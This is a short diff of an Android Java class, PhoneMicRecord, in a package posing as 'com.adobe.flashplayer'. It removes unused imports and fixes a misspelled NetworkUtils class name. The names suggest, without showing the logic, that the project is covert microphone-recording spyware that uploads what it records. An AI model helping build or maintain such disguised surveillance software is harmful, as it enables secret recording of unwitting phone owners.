@@ -10,11 +10,10 @@ import androidx.core.content.ContextCompat;
 import com.adobe.flashplayer.Utils;
 import com.adobe.flashplayer.network.UploadData;
 import com.adobe.flashplayer.MyLog;
-import android.content.pm.ApplicationInfo;
-import android.content.pm.PackageInfo;
+
 import android.content.pm.PackageManager;
-import android.content.ContentResolver;
-import com.adobe.flashplayer.network.NetworkUitls;
+
+import com.adobe.flashplayer.network.NetworkUtils;
 
 
 public class PhoneMicRecord implements Runnable{
@@ -63,7 +62,7 @@ public class PhoneMicRecord implements Runnable{
                 recorder.reset();
                 recorder.release();
 
-                if (NetworkUitls.isNetworkAvailable(context) == false) {
+                if (NetworkUtils.isNetworkAvailable(context) == false) {
                     return;
                 }
 
